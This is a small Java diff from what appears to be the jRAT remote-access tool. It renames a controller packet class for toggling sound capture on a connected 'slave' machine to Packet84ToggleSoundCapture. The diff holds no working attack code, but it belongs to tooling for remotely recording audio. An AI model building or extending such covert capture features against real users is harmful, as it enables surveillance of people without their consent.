@@ -5,11 +5,11 @@ import java.io.DataOutputStream;
 import se.jrat.controller.Slave;
 
 
-public class Packet84SoundCapture extends AbstractOutgoingPacket {
+public class Packet84ToggleSoundCapture extends AbstractOutgoingPacket {
 
 	private boolean enable;
 
-	public Packet84SoundCapture(boolean enable) {
+	public Packet84ToggleSoundCapture(boolean enable) {
 		this.enable = enable;
 	}
 
